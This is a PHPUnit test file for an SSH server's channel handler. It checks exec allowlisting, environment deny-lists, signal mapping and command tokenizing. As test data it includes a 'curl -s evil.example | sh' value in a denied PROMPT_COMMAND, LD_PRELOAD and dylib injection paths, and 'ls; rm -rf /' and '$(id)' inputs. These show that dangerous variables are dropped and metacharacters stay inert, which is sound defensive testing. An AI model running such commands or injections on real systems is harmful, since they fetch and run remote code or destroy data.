<?php

declare(strict_types=1);

namespace SugarCraft\SshServer\Tests\Channel;

use PHPUnit\Framework\TestCase;
use SugarCraft\SshServer\Channel\DefaultChannelHandler;
use SugarCraft\SshServer\Channel\Msg\BreakMsg;
use SugarCraft\SshServer\Channel\Msg\EnvMsg;
use SugarCraft\SshServer\Channel\Msg\ExecMsg;
use SugarCraft\SshServer\Channel\Msg\PtyReqMsg;
use SugarCraft\SshServer\Channel\Msg\ShellMsg;
use SugarCraft\SshServer\Channel\Msg\SignalMsg;
use SugarCraft\SshServer\Channel\Msg\WindowChangeMsg;
use SugarCraft\SshServer\Session;
use SugarCraft\SshServer\Transport\ChildSpawner;

final class DefaultChannelHandlerTest extends TestCase
{
    /** @var list<resource> */
    private array $streams = [];

    protected function tearDown(): void
    {
        foreach ($this->streams as $stream) {
            if (\is_resource($stream)) {
                \fclose($stream);
            }
        }
        $this->streams = [];
    }

    private function fakeSession(): Session
    {
        return new Session(
            user: 'alice', clientHost: '127.0.0.1', clientPort: 1, serverHost: '127.0.0.1',
            serverPort: 22, term: 'xterm-256color', cols: 80, rows: 24, tty: '/dev/pts/0',
            command: null, lang: 'C.UTF-8',
        );
    }

    public function testHandlePtyReqTrueSetsPtyAllocated(): void
    {
        $handler = new DefaultChannelHandler();
        $msg = new PtyReqMsg(wantPty: true, term: 'xterm-256color', cols: 120, rows: 40);

        $handler->handlePtyReq($msg, $this->fakeSession());

        $this->assertTrue($handler->ptyAllocated());
        $this->assertSame(120, $handler->cols());
        $this->assertSame(40, $handler->rows());
    }

    public function testHandlePtyReqFalseClearsPtyAllocated(): void
    {
        $handler = new DefaultChannelHandler();
        $handler->handlePtyReq(new PtyReqMsg(wantPty: true, cols: 100, rows: 30), $this->fakeSession());
        $this->assertTrue($handler->ptyAllocated());

        $handler->handlePtyReq(new PtyReqMsg(wantPty: false), $this->fakeSession());

        $this->assertFalse($handler->ptyAllocated());
    }

    public function testHandlePtyReqWithZeroColsUsesSessionCols(): void
    {
        $handler = new DefaultChannelHandler();
        $session = new Session(
            user: 'alice', clientHost: '127.0.0.1', clientPort: 1, serverHost: '127.0.0.1',
            serverPort: 22, term: 'xterm', cols: 0, rows: 0, tty: null,
            command: null, lang: 'C',
        );

        $handler->handlePtyReq(new PtyReqMsg(wantPty: true, cols: 0, rows: 0), $session);

        $this->assertSame(80, $handler->cols());
        $this->assertSame(24, $handler->rows());
    }

    public function testHandleWindowChangeUpdatesColsAndRows(): void
    {
        $handler = new DefaultChannelHandler();

        $handler->handleWindowChange(new WindowChangeMsg(cols: 160, rows: 50), $this->fakeSession());

        $this->assertSame(160, $handler->cols());
        $this->assertSame(50, $handler->rows());
    }

    public function testHandleWindowChangeWithZeroValuesFallsBack(): void
    {
        $handler = new DefaultChannelHandler();
        $handler->handleWindowChange(new WindowChangeMsg(cols: 0, rows: 0), $this->fakeSession());

        $this->assertSame(80, $handler->cols());
        $this->assertSame(24, $handler->rows());
    }

    public function testHandleShellSetsShellRequestedFalse(): void
    {
        $handler = new DefaultChannelHandler();

        $handler->handleShell(new ShellMsg(wantShell: false), $this->fakeSession());

        $this->assertFalse($handler->shellRequested());
    }

    /**
     * A refused request is still DECODED and remembered: the operator
     * needs to see what the peer asked for, and an embedder reading
     * pendingCommand() must not have to know whether the policy allowed
     * the spawn (audit K1).
     */
    public function testHandleExecSetsExecRequestedTrue(): void
    {
        [$err, $read] = $this->sink();
        $handler = new DefaultChannelHandler(stderr: $err);

        $handler->handleExec(new ExecMsg('echo hello'), $this->fakeSession());

        $this->assertTrue($handler->execRequested());
        $this->assertSame(['echo', 'hello'], $handler->pendingCommand());
        $this->assertStringContainsString('Exec request refused: echo', $read());
    }

    public function testHandleExecParsesSimpleCommand(): void
    {
        [$err, $read] = $this->sink();
        $handler = new DefaultChannelHandler(allowedExec: ['/bin/ls'], stderr: $err);

        $handler->handleExec(new ExecMsg('/bin/ls -la /tmp'), $this->fakeSession());

        $this->assertSame(['/bin/ls', '-la', '/tmp'], $handler->pendingCommand());
        $this->assertSame('', $read(), 'an allowlisted program is not refused');
    }

    public function testHandleExecParsesQuotedCommand(): void
    {
        [$err, $read] = $this->sink();
        $handler = new DefaultChannelHandler(stderr: $err);

        $handler->handleExec(new ExecMsg("echo 'hello world'"), $this->fakeSession());

        $this->assertSame(['echo', 'hello world'], $handler->pendingCommand());
    }

    public function testHandleExecPreservesEmptyQuotedArg(): void
    {
        [$err, $read] = $this->sink();
        $handler = new DefaultChannelHandler(stderr: $err);

        $handler->handleExec(new ExecMsg("cmd ''"), $this->fakeSession());

        $this->assertSame(['cmd', ''], $handler->pendingCommand());
    }

    public function testHandleExecBackslashEscapeOutsideQuotes(): void
    {
        [$err, $read] = $this->sink();
        $handler = new DefaultChannelHandler(stderr: $err);

        // `foo\ bar` → single token `foo bar`
        $handler->handleExec(new ExecMsg('echo foo\ bar'), $this->fakeSession());

        $this->assertSame(['echo', 'foo bar'], $handler->pendingCommand());
    }

    /**
     * @return array{0:resource,1:callable():string}
     */
    private function sink(): array
    {
        $memory = \fopen('php://memory', 'w+');
        $this->assertIsResource($memory);
        $this->streams[] = $memory;

        return [$memory, function () use ($memory): string {
            \rewind($memory);

            return (string) \stream_get_contents($memory);
        }];
    }

    public function testHandleSignalIsNoOp(): void
    {
        $handler = new DefaultChannelHandler();

        $handler->handleSignal(new SignalMsg('SIGINT'), $this->fakeSession());

        $this->assertNull($handler->ptyAllocated());
        $this->assertSame(80, $handler->cols());
        $this->assertSame(24, $handler->rows());
    }

    public function testHandleSignalForwardsEveryMappedNameAsItsPosixNumber(): void
    {
        // Pin: the map must resolve through \defined() —
        // reading an undefined \SIG* constant throws before `??` can
        // fall back, fataling on pcntl-less hosts. Expected values are
        // derived (constant when defined, documented POSIX fallback
        // otherwise) so the pin holds with and without ext-pcntl.
        $forwarded = [];
        $spy = new class($forwarded) implements ChildSpawner {
            /** @var array<int> */
            private array $sink;

            public function __construct(array &$sink)
            {
                $this->sink = &$sink;
            }

            public function runChild(Session $session, array $cmd, ?array $env = null): int
            {
                return 0;
            }

            public function signalChild(int $signal): void
            {
                $this->sink[] = $signal;
            }
        };
        $handler = new DefaultChannelHandler($spy);

        $expected = [
            'INT'   => \defined('SIGINT') ? \SIGINT : 2,
            'TERM'  => \defined('SIGTERM') ? \SIGTERM : 15,
            'HUP'   => \defined('SIGHUP') ? \SIGHUP : 1,
            'QUIT'  => \defined('SIGQUIT') ? \SIGQUIT : 3,
            'KILL'  => \defined('SIGKILL') ? \SIGKILL : 9,
            'USR1'  => \defined('SIGUSR1') ? \SIGUSR1 : 10,
            'USR2'  => \defined('SIGUSR2') ? \SIGUSR2 : 12,
            'WINCH' => \defined('SIGWINCH') ? \SIGWINCH : 28,
        ];
        foreach ($expected as $name => $number) {
            $handler->handleSignal(new SignalMsg($name), $this->fakeSession());
        }
        $handler->handleSignal(new SignalMsg('STOP'), $this->fakeSession());
        $handler->handleSignal(new SignalMsg('SIGINT'), $this->fakeSession());

        $this->assertSame(\array_values($expected), $forwarded, 'mapped names forward in order; unmapped names forward nothing');
    }

    public function testHandleEnvCollectsEnvVars(): void
    {
        $handler = new DefaultChannelHandler();

        $handler->handleEnv(new EnvMsg('FOO', 'bar'), $this->fakeSession());
        $handler->handleEnv(new EnvMsg('BAZ', 'qux'), $this->fakeSession());

        $this->assertSame(['FOO' => 'bar', 'BAZ' => 'qux'], $handler->envVars());
    }

    public function testHandleBreakIsNoOp(): void
    {
        $handler = new DefaultChannelHandler();

        $handler->handleBreak(new BreakMsg(breakLengthMs: 500), $this->fakeSession());

        $this->assertNull($handler->ptyAllocated());
        $this->assertFalse($handler->shellRequested());
        $this->assertFalse($handler->execRequested());
    }

    public function testDefaultHandlerHasNoPtyAllocatedInitially(): void
    {
        $handler = new DefaultChannelHandler();

        $this->assertNull($handler->ptyAllocated());
    }

    public function testDefaultHandlerHasDefaultColsRows(): void
    {
        $handler = new DefaultChannelHandler();

        $this->assertSame(80, $handler->cols());
        $this->assertSame(24, $handler->rows());
    }

    public function testEnvVarsEmptyInitially(): void
    {
        $handler = new DefaultChannelHandler();

        $this->assertSame([], $handler->envVars());
    }

    public function testPtyAllocatedFalseInitially(): void
    {
        $handler = new DefaultChannelHandler();

        $this->assertFalse($handler->shellRequested());
        $this->assertFalse($handler->execRequested());
    }

    /**
     * @return array{env: array<string,string>}
     */
    private function captureChildEnv(array $acceptEnv = []): array
    {
        $capturedEnv = [];
        $spy = new class($capturedEnv) implements ChildSpawner {
            /** @var array<string,string> */
            private array $captured;

            public function __construct(array &$captured)
            {
                $this->captured = &$captured;
            }

            public function runChild(Session $session, array $cmd, ?array $env = null): int
            {
                $this->captured = $env ?? [];
                return 0;
            }

            public function signalChild(int $signal): void {}
        };

        $handler = new DefaultChannelHandler($spy, null, $acceptEnv);
        $handler->handleShell(new ShellMsg(wantShell: true), $this->fakeSession());

        return ['env' => $capturedEnv];
    }

    public function testBuildEnvReturnsFloorWhenNoClientEnv(): void
    {
        $result = $this->captureChildEnv([]);

        $this->assertArrayHasKey('TERM', $result['env']);
        $this->assertArrayHasKey('USER', $result['env']);
        $this->assertArrayHasKey('LANG', $result['env']);
        $this->assertArrayHasKey('PATH', $result['env']);
        $this->assertArrayHasKey('HOME', $result['env']);
    }

    public function testBuildEnvDropsDangerousVarsEvenIfAllowlisted(): void
    {
        $capturedEnv = [];
        $spy = new class($capturedEnv) implements ChildSpawner {
            /** @var array<string,string> */
            private array $captured;

            public function __construct(array &$captured)
            {
                $this->captured = &$captured;
            }

            public function runChild(Session $session, array $cmd, ?array $env = null): int
            {
                $this->captured = $env ?? [];
                return 0;
            }

            public function signalChild(int $signal): void {}
        };

        // Include a dangerous var in acceptEnv — it must still be dropped.
        $handler = new DefaultChannelHandler($spy, null, ['LD_PRELOAD', 'PATH']);
        $handler->handleEnv(new EnvMsg('LD_PRELOAD', '/malicious.so'), $this->fakeSession());
        $handler->handleEnv(new EnvMsg('FOO', 'bar'), $this->fakeSession());
        $handler->handleShell(new ShellMsg(wantShell: true), $this->fakeSession());

        $this->assertArrayNotHasKey('LD_PRELOAD', $capturedEnv);
        // Floor PATH is always present (as a baseline), but client-supplied PATH
        // from EnvMsg is never merged since PATH is in DANGEROUS_VARS.
        // The floor PATH comes from getenv('PATH') ?: '/usr/local/bin:/usr/bin:/bin'
        // and varies by environment. Verify only that it's not the malicious
        // client-supplied value and contains expected safe directories.
        $this->assertNotSame('/usr/custom/bin', $capturedEnv['PATH']);
        // The floor PATH mirrors buildEnv()'s own derivation exactly — the
        // host PATH varies wildly across CI runners (macOS hostedtoolcache
        // PATHs don't contain the Linux '/usr/bin:/sbin:/bin' run), so
        // asserting any fixed substring is environment-dependent.
        $this->assertSame(getenv('PATH') ?: '/usr/local/bin:/usr/bin:/bin', $capturedEnv['PATH']);
    }

    public function testTheLoaderAndShellHookNamesAreDeniedEvenWhenAllowlisted(): void
    {
        $capturedEnv = [];
        $spy = new class($capturedEnv) implements ChildSpawner {
            /** @var array<string,string> */
            private array $captured;

            public function __construct(array &$captured)
            {
                $this->captured = &$captured;
            }

            public function runChild(Session $session, array $cmd, ?array $env = null): int
            {
                $this->captured = $env ?? [];
                return 0;
            }

            public function signalChild(int $signal): void {}
        };

        // Every one of these is a name whose value decides what code the
        // child runs, which library it loads, or where it looks for one.
        $denied = [
            'LD_AUDIT'             => '/audit.so',
            'DYLD_INSERT_LIBRARIES' => '/injected.dylib',
            'DYLD_LIBRARY_PATH'    => '/tmp/libs',
            'GCONV_PATH'           => '/tmp/gconv',
            'PROMPT_COMMAND'       => 'curl -s evil.example | sh',
            'HOSTALIASES'          => '/tmp/hosts',
            'POSIXLY_CORRECT'      => '1',
        ];

        $handler = new DefaultChannelHandler($spy, null, [...\array_keys($denied), 'LOCALE_HINT']);
        foreach ($denied as $name => $value) {
            $handler->handleEnv(new EnvMsg($name, $value), $this->fakeSession());
        }
        $handler->handleEnv(new EnvMsg('LOCALE_HINT', 'de_DE'), $this->fakeSession());
        $handler->handleShell(new ShellMsg(wantShell: true), $this->fakeSession());

        foreach (\array_keys($denied) as $name) {
            $this->assertArrayNotHasKey(
                $name,
                $capturedEnv,
                $name . ' reached the child environment despite the deny-list',
            );
        }

        // Negative control: an ordinary allowlisted name still arrives, so
        // the assertions above are not passing because nothing merged.
        $this->assertSame('de_DE', $capturedEnv['LOCALE_HINT'] ?? null);
    }

    public function testBuildEnvPassesAllowlistedVars(): void
    {
        $capturedEnv = [];
        $spy = new class($capturedEnv) implements ChildSpawner {
            /** @var array<string,string> */
            private array $captured;

            public function __construct(array &$captured)
            {
                $this->captured = &$captured;
            }

            public function runChild(Session $session, array $cmd, ?array $env = null): int
            {
                $this->captured = $env ?? [];
                return 0;
            }

            public function signalChild(int $signal): void {}
        };

        $handler = new DefaultChannelHandler($spy, null, ['FOO', 'COLOR']);
        $handler->handleEnv(new EnvMsg('FOO', 'bar'), $this->fakeSession());
        $handler->handleEnv(new EnvMsg('COLOR', 'true'), $this->fakeSession());
        $handler->handleShell(new ShellMsg(wantShell: true), $this->fakeSession());

        $this->assertSame('bar', $capturedEnv['FOO']);
        $this->assertSame('true', $capturedEnv['COLOR']);
    }

    public function testBuildEnvDropsNonAllowlistedVars(): void
    {
        $capturedEnv = [];
        $spy = new class($capturedEnv) implements ChildSpawner {
            /** @var array<string,string> */
            private array $captured;

            public function __construct(array &$captured)
            {
                $this->captured = &$captured;
            }

            public function runChild(Session $session, array $cmd, ?array $env = null): int
            {
                $this->captured = $env ?? [];
                return 0;
            }

            public function signalChild(int $signal): void {}
        };

        $handler = new DefaultChannelHandler($spy, null, ['FOO']);
        $handler->handleEnv(new EnvMsg('FOO', 'bar'), $this->fakeSession());
        $handler->handleEnv(new EnvMsg('BAR', 'baz'), $this->fakeSession()); // not allowlisted
        $handler->handleShell(new ShellMsg(wantShell: true), $this->fakeSession());

        $this->assertSame('bar', $capturedEnv['FOO']);
        $this->assertArrayNotHasKey('BAR', $capturedEnv);
    }

    /**
     * Run a shell request with the given explicit configured shell and
     * process `SHELL` env value (null = unset, '' = set-but-empty) and
     * capture the argv handed to the spawner. The env is restored in
     * `finally` — putenv changes must never leak across tests.
     *
     * @return list<string>
     */
    private function captureShellArgv(?string $configuredShell, ?string $shellEnv): array
    {
        $capturedCmd = [];
        $spy = new class($capturedCmd) implements ChildSpawner {
            /** @var list<string> */
            private array $cmd;

            public function __construct(array &$cmd)
            {
                $this->cmd = &$cmd;
            }

            public function runChild(Session $session, array $cmd, ?array $env = null): int
            {
                $this->cmd = $cmd;
                return 0;
            }

            public function signalChild(int $signal): void {}
        };

        $originalShell = getenv('SHELL');
        try {
            if ($shellEnv === null) {
                putenv('SHELL');
            } else {
                putenv('SHELL=' . $shellEnv);
            }

            $handler = new DefaultChannelHandler($spy, null, [], $configuredShell);
            $handler->handleShell(new ShellMsg(wantShell: true), $this->fakeSession());
        } finally {
            if ($originalShell === false) {
                putenv('SHELL');
            } else {
                putenv('SHELL=' . $originalShell);
            }
        }

        return $capturedCmd;
    }

    public function testConfiguredShellWinsOverEnvironment(): void
    {
        $this->assertSame(
            ['/bin/zsh', '-l'],
            $this->captureShellArgv('/bin/zsh', '/bin/fish'),
        );
    }

    public function testShellEnvironmentHonoredWhenNoShellConfigured(): void
    {
        $this->assertSame(
            ['/bin/fish', '-l'],
            $this->captureShellArgv(null, '/bin/fish'),
        );
    }

    public function testFallbackShellWhenNeitherConfiguredNorEnvironment(): void
    {
        $argv = $this->captureShellArgv(null, null);

        $this->assertSame([DefaultChannelHandler::FALLBACK_SHELL, '-l'], $argv);
        // The fallback is the POSIX-guaranteed interpreter — pin the value
        // so a silent swap back to a distro-specific path is visible.
        $this->assertSame('/bin/sh', DefaultChannelHandler::FALLBACK_SHELL);
    }

    public function testBlankConfiguredShellFallsThroughToEnvironment(): void
    {
        $this->assertSame(
            ['/bin/fish', '-l'],
            $this->captureShellArgv('   ', '/bin/fish'),
        );
    }

    /**
     * `SHELL=...` set-but-EMPTY is not a shell — the blank-coercion
     * leg in resolveShell() must reject it and land on the fallback.
     * Distinct from the unset leg (getenv() returns '' here, not false),
     * which is what the `is_string()` arm alone would let through.
     */
    public function testEmptyShellEnvironmentFallsBackToDefault(): void
    {
        $this->assertSame(
            [DefaultChannelHandler::FALLBACK_SHELL, '-l'],
            $this->captureShellArgv(null, ''),
        );
    }

    /**
     * Whitespace-only `SHELL` is just as blank as '' — this is the
     * leg that pins the trim() coercion itself (a bare `!== ''` compare
     * would sail past '   ' and exec a garbage argv).
     */
    public function testWhitespaceOnlyShellEnvironmentFallsBackToDefault(): void
    {
        $this->assertSame(
            [DefaultChannelHandler::FALLBACK_SHELL, '-l'],
            $this->captureShellArgv(null, '   '),
        );
    }

    /**
     * spawnShell must re-derive ONLY geometry —
     * the protocol metadata InProcessTransport::run attached via
     * withProtocolMetadata rides into the child session untouched.
     */
    public function testSpawnShellCarriesProtocolMetadataIntoChildSession(): void
    {
        $captured = null;
        $spy = new class($captured) implements ChildSpawner {
            private mixed $sink;

            public function __construct(mixed &$sink)
            {
                $this->sink = &$sink;
            }

            public function runChild(Session $session, array $cmd, ?array $env = null): int
            {
                $this->sink = $session;
                return 0;
            }

            public function signalChild(int $signal): void {}
        };

        $session = $this->fakeSession()->withProtocolMetadata(
            sessionId: 'deadbeef',
            authMethod: 'publickey',
            keyFingerprint: null,
            clientVersion: 'SSH-2.0-test',
            serverVersion: 'SSH-2.0-wish',
        )->withSize(132, 43);

        $handler = new DefaultChannelHandler($spy);
        $handler->handleShell(new ShellMsg(wantShell: true), $session);

        $this->assertInstanceOf(Session::class, $captured);
        $this->assertSame('deadbeef', $captured->sessionId);
        $this->assertSame('publickey', $captured->authMethod);
        $this->assertSame('SSH-2.0-test', $captured->clientVersion);
        $this->assertSame('SSH-2.0-wish', $captured->serverVersion);
        $this->assertSame(132, $captured->cols);
        $this->assertSame(43, $captured->rows);
    }

    /**
     * @return array{0:object{calls():list<array{0:string}>},1:\SugarCraft\SshServer\Channel\DefaultChannelHandler}
     */
    private function recordingHandler(array $allowedExec = [], mixed $gate = null): array
    {
        $seen = [];
        $spy = new class($seen) implements ChildSpawner {
            /** @var list<list<string>> */
            public array $spawned = [];

            /** @param list<list<string>> $sink */
            public function __construct(array &$sink)
            {
                $this->spawned = &$sink;
            }

            public function runChild(Session $session, array $cmd, ?array $env = null): int
            {
                $this->spawned[] = $cmd;

                return 0;
            }

            public function signalChild(int $signal): void {}
        };
        [$err, $read] = $this->sink();
        $handler = new DefaultChannelHandler($spy, null, [], null, $allowedExec, $gate, $err);

        return [$spy, $handler, $read];
    }

    public function testNothingIsSpawnedByAnExecRequestUntilTheOperatorAllowsAProgram(): void
    {
        [$spy, $handler, $read] = $this->recordingHandler();

        $handler->handleExec(new ExecMsg('/bin/ls -la'), $this->fakeSession());

        $this->assertSame([], $spy->spawned, 'silence must not be permission (audit K1)');
        $this->assertStringContainsString('Exec request refused: /bin/ls', $read());
    }

    /**
     * The refusal is also latched on the session, not merely announced:
     * `Server::resolveStatus` can then answer 129 instead of the `0` that
     * "nothing ran" would otherwise give (audit 004).
     */
    public function testARefusedExecLatchesTheSessionForTheExitContract(): void
    {
        [$spy, $handler] = $this->recordingHandler();
        $session = $this->fakeSession();

        $handler->handleExec(new ExecMsg('/bin/ls -la'), $session);

        $this->assertSame([], $spy->spawned);
        $this->assertTrue($session->refused(), 'the exec denial must reach the exit contract');
    }

    public function testAGrantedOrEmptyExecRequestLeavesTheSessionUnlatched(): void
    {
        [$spy, $handler] = $this->recordingHandler(['/bin/ls']);
        $granted = $this->fakeSession();

        $handler->handleExec(new ExecMsg('/bin/ls'), $granted);

        $this->assertCount(1, $spy->spawned);
        $this->assertFalse($granted->refused(), 'a granted request is not a refusal');

        $empty = $this->fakeSession();
        $handler->handleExec(new ExecMsg(''), $empty);

        $this->assertTrue($handler->execRequested());
        $this->assertFalse($empty->refused(), 'nothing-to-run is a nothing-to-do success, not a denial');
    }

    public function testTheAllowlistSpawnsTheExactProgramWithItsArguments(): void
    {
        [$spy, $handler] = $this->recordingHandler(['/bin/ls']);

        $handler->handleExec(new ExecMsg('/bin/ls -la /tmp'), $this->fakeSession());

        $this->assertSame([['/bin/ls', '-la', '/tmp']], $spy->spawned);
    }

    public function testTheAllowlistMatchesTheWholeProgramPathNotAPrefix(): void
    {
        [$spy, $handler, $read] = $this->recordingHandler(['/bin/ls']);

        $handler->handleExec(new ExecMsg('/bin/lsblk'), $this->fakeSession());

        $this->assertSame([], $spy->spawned);
        $this->assertStringContainsString('Exec request refused: /bin/lsblk', $read());
    }

    public function testTheGateVetoesEvenAnAllowlistedProgram(): void
    {
        [$spy, $handler, $read] = $this->recordingHandler(['/bin/ls'], static fn (): bool => false);

        $handler->handleExec(new ExecMsg('/bin/ls'), $this->fakeSession());

        $this->assertSame([], $spy->spawned);
        $this->assertStringContainsString('Exec request refused: /bin/ls', $read());
    }

    public function testTheGateSeesTheSessionAndTheDecodedArguments(): void
    {
        $asked = [];
        $gate = static function (Session $session, array $argv) use (&$asked): bool {
            $asked[] = [$session->user, $argv];

            return true;
        };
        [$spy, $handler] = $this->recordingHandler(['/bin/ls'], $gate);

        $handler->handleExec(new ExecMsg("/bin/ls 'two words'"), $this->fakeSession());

        $this->assertSame([['alice', ['/bin/ls', 'two words']]], $asked);
        $this->assertCount(1, $spy->spawned);
    }

    public function testAGateThatCannotAnswerHasNotGivenPermission(): void
    {
        [$spy, $handler] = $this->recordingHandler(['/bin/ls'], static function (): bool {
            throw new \RuntimeException('policy backend down');
        });

        $handler->handleExec(new ExecMsg('/bin/ls'), $this->fakeSession());

        $this->assertSame([], $spy->spawned);
    }

    public function testOnlyAnExactTrueFromTheGateAdmitsTheRequest(): void
    {
        [$spy, $handler] = $this->recordingHandler(['/bin/ls'], static fn (): int => 1);

        $handler->handleExec(new ExecMsg('/bin/ls'), $this->fakeSession());

        $this->assertSame([], $spy->spawned, 'a truthy non-bool is not consent');
    }

    public function testAnEmptyRequestIsNotAnnouncedAsARefusal(): void
    {
        [$spy, $handler, $read] = $this->recordingHandler();

        $handler->handleExec(new ExecMsg('   '), $this->fakeSession());

        $this->assertSame([], $spy->spawned);
        $this->assertSame('', $read());
    }

    public function testTheRefusalNamesNoServerPathAndNoPolicyContent(): void
    {
        [$spy, $handler, $read] = $this->recordingHandler(['/bin/true']);

        $handler->handleExec(new ExecMsg('/etc/passwd'), $this->fakeSession());
        $notice = $read();

        $this->assertStringNotContainsString(\dirname(__DIR__), $notice);
        $this->assertStringNotContainsString('/bin/true', $notice, 'the allowlist itself must not leak');
    }

    public function testAPeerChosenProgramNameCannotSmuggleControlBytesIntoTheNotice(): void
    {
        [$spy, $handler, $read] = $this->recordingHandler();

        $handler->handleExec(new ExecMsg("/bin/echo\x01\x02banner"), $this->fakeSession());
        $notice = $read();

        $this->assertStringNotContainsString("\x01", $notice);
        $this->assertStringNotContainsString("\x02", $notice);
        $this->assertStringContainsString('/bin/echobanner', $notice);
    }

    public function testTheNoticeKeepsRealMultibyteProgramNamesIntact(): void
    {
        [$spy, $handler, $read] = $this->recordingHandler();

        // A byte-wise \x7f-\x9f sweep would corrupt this; the codepoint
        // walk must leave the printable characters alone.
        $handler->handleExec(new ExecMsg("/bin/ls\u{00e9}\u{00e9}"), $this->fakeSession());

        $this->assertStringContainsString("/bin/ls\u{00e9}\u{00e9}", $read());
    }

    public function testTheDecoderIsThePublicOriginalCommandEntryPoint(): void
    {
        $this->assertSame(
            ['/bin/sh', '-c', 'exit 0'],
            DefaultChannelHandler::decodeCommandString("/bin/sh -c 'exit 0'"),
        );
        // Nothing reaches a shell, so metacharacters stay inert arguments
        // — the property the exec gate relies on.
        $this->assertSame(
            ['ls;', 'rm', '-rf', '/'],
            DefaultChannelHandler::decodeCommandString('ls; rm -rf /'),
        );
        $this->assertSame(
            ['echo', '$(id)', '`id`', '$HOME'],
            DefaultChannelHandler::decodeCommandString('echo $(id) `id` "$HOME"'),
        );
        $this->assertSame([], DefaultChannelHandler::decodeCommandString(''));
    }

    /**
     * The documented tokenizer edges (audit 086), pinned against the
     * POSIX double-quote rule now implemented (audit 007): a backslash
     * inside `"…"` escapes only `$`, backtick, `"` and `\` — before any
     * other character it stays literal itself.
     */
    public function testTheDoubleQuoteEscapeRuleIsThePosixOne(): void
    {
        $this->assertSame(
            ['a"b'],
            DefaultChannelHandler::decodeCommandString('"a\\"b"'),
            'the sending shell escapes the quote; the decoder must recover it',
        );
        $this->assertSame(
            ['C:\\path'],
            DefaultChannelHandler::decodeCommandString('"C:\\\\path"'),
        );
        $this->assertSame(
            ['C:\\path'],
            DefaultChannelHandler::decodeCommandString('"C:\path"'),
            'before a non-escape character the backslash is literal — Windows paths survive',
        );
        $this->assertSame(
            ['a$b'],
            DefaultChannelHandler::decodeCommandString('"a\\$b"'),
            'the escape restores the byte only — $HOME is still literal text, never a lookup',
        );
        $this->assertSame(
            ['ab'],
            DefaultChannelHandler::decodeCommandString("\"a\\\nb\""),
            'backslash-newline inside quotes is a line continuation',
        );
        $this->assertSame(
            ['a\\'],
            DefaultChannelHandler::decodeCommandString('"a\\'),
            'a trailing backslash that never met its next char keeps its byte',
        );
    }

    public function testUnclosedQuotesAndTrailingBackslashesKeepTheirDocumentedShape(): void
    {
        // (a) the swallow leg: an unclosed single quote takes the rest of
        // the string as one token.
        $this->assertSame(
            ['echo', 'unclosed rest'],
            DefaultChannelHandler::decodeCommandString("echo 'unclosed rest"),
        );
        // (c) outside quotes, a trailing backslash meets end-of-string and
        // is simply dropped.
        $this->assertSame(
            ['ls'],
            DefaultChannelHandler::decodeCommandString('ls \\'),
        );
        // The escape leg that motivated the rule: one token with a space.
        $this->assertSame(
            ['foo bar'],
            DefaultChannelHandler::decodeCommandString('foo\\ bar'),
        );
    }

    public function testTheDormantDispatchTruthIsOnTheClassAndInTheReadme(): void
    {
        $doc = (string) \file_get_contents(\dirname(__DIR__, 2) . '/src/Channel/DefaultChannelHandler.php');
        // Markdown wraps mid-phrase, so doc needles are matched on a
        // whitespace-flattened copy (house shape for README pins).
        $readme = (string) \preg_replace(
            '/\s+/u',
            ' ',
            (string) \file_get_contents(\dirname(__DIR__, 2) . '/README.md'),
        );

        $this->assertStringContainsString('audit K1', $doc);
        $this->assertStringContainsString('WindowChangeMsg', $doc);
        $this->assertStringContainsString('SSH_ORIGINAL_COMMAND', $doc);
        $this->assertStringNotContainsString('ChannelHandler dispatch are complete', $readme);
        $this->assertStringContainsString('not fed from the wire', $readme);
    }
}
